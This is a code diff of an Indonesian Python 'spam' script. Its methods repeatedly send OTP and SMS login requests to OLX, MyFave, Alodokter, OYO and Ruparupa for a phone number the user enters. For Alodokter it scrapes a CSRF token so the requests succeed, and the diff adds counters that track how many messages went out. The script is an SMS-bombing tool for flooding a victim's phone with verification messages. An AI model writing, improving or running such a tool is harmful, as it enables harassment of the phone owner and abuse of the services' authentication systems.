@@ -37,6 +37,8 @@ def panggil():
 
 class spam:
     def olx(nom):
+        berhasil = 0
+        gagal = 0
         for i in range(3):
             headers = {
                 "accept": "*/*",
@@ -49,10 +51,17 @@ class spam:
                                "method": "sms",
                                "phone": "+62"+nom,
                                "language": "id"})
-            requests.Session().post("https://www.olx.co.id/api/auth/authenticate",
-                                    data=data, headers=headers).text
+            r = requests.Session().post("https://www.olx.co.id/api/auth/authenticate",
+                                        data=data, headers=headers).text
+            if "PENDING" in r:
+                berhasil += 1
+            else:
+                gagal += 1
+        print(f"jumlah olx: {berhasil}/{gagal}")
 
     def fav(nom):
+        berhasil = 0
+        gagal = 0
         for i in range(3):
             hd = {
                 "Host": "api.myfave.com",
@@ -67,15 +76,22 @@ class spam:
                 "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
             }
             dat = {'phone': '62'+nom}
-            requests.post("https://api.myfave.com/api/fave/v3/auth",
-                          data=json.dumps(dat), headers=hd).text
+            r = requests.post("https://api.myfave.com/api/fave/v3/auth",
+                              data=json.dumps(dat), headers=hd).text
+            if "request_id" in r:
+                berhasil += 1
+            else:
+                gagal += 1
+        print(f"jumlah fav: {berhasil}/{gagal}")
 
     def alodokter(nom):
+        berhasil = 0
+        gagal = 0
         for i in range(3):
-            r = requests.Session()
-            r.headers.update(
+            res = requests.Session()
+            res.headers.update(
                 {'referer': 'https://www.alodokter.com/login-alodokter'})
-            hy = r.get("https://www.alodokter.com/login-alodokter")
+            hy = res.get("https://www.alodokter.com/login-alodokter")
             tol = bs(hy.text, 'html.parser')
             token = tol.find('meta', {'name': 'csrf-token'})['content']
             hd = {
@@ -86,12 +102,19 @@ class spam:
                 'origin': 'https://www.alodokter.com',
                 'x-csrf-token': token
             }
-            r.post("https://www.alodokter.com/login-with-phone-number",
-                   headers=hd, json={"user": {"phone": "0"+nom}})
+            r = res.post("https://www.alodokter.com/login-with-phone-number",
+                         headers=hd, json={"user": {"phone": "0"+nom}}).text
+            if "success" in r:
+                berhasil += 1
+            else:
+                gagal += 1
+        print(f"jumlah aldokter: {berhasil}/{gagal}")
 
     def oyo(nom):
+        berhasil = 0
+        gagal = 0
         for i in range(3):
-            r = requests.Session()
+            res = requests.Session()
             hd = {
                 "Host": "identity-gateway.oyorooms.com",
                 "consumer_host": "https://www.oyorooms.com",
@@ -101,15 +124,22 @@ class spam:
                 "Content-Type": "application/json",
                 "accept": "*/*",
                 "origin": "https://www.oyorooms.com",
-                "referer": "https://www.oyorooms.com/login",
-                "Accept-Encoding": "gzip, deflate, br",
+                        "referer": "https://www.oyorooms.com/login",
+                        "Accept-Encoding": "gzip, deflate, br",
             }
             dat = json.dumps({"phone": nom, "country_code": "+62", "country_iso_code": "ID",
                               "nod": "4", "send_otp": "true", "devise_role": "Consumer_Guest"})
-            r.post(
-                "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", headers=hd, data=dat)
+            r = res.post(
+                "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", headers=hd, data=dat).text
+            if "SUCCESSFULLY GENERATED OTP" in r:
+                berhasil += 1
+            else:
+                gagal += 1
+        print(f"jumlah oyo: {berhasil}/{gagal}")
 
     def ruparupa(nom):
+        berhasil = 0
+        gagal = 0
         for i in range(3):
             url = 'https://wapi.ruparupa.com/auth/check-otp-auth'
             url2 = 'https://wapi.ruparupa.com/auth/generate-otp'
@@ -147,8 +177,13 @@ class spam:
             dataurl2 = {"phone": "0"+nom, "action": "register",
                         "channel": "chat", "email": "", "customer_id": "0", "is_resend": 0}
             dataurl2json = json.dumps(dataurl2)
-            requests.post(url, headers=hdurl, data=dataurljson).text
-            requests.post(url2, headers=hdurl2, data=dataurl2json).text
+            r1 = requests.post(url, headers=hdurl, data=dataurljson).text
+            r2 = requests.post(url2, headers=hdurl2, data=dataurl2json).text
+            if "success" in r1:
+                berhasil += 1
+            else:
+                gagal += 1
+        print(f"jumlah rupa-rupa: {berhasil}/{gagal}")
 
 
 def tmpl():
